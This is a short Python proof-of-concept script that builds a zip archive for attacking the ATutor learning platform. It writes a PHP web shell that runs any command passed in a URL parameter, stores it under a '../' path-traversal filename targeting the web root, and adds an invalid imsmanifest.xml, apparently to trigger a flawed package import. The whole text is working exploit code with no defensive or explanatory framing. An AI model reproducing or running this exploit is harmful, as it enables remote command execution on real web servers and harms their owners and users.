#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml', "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>")
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()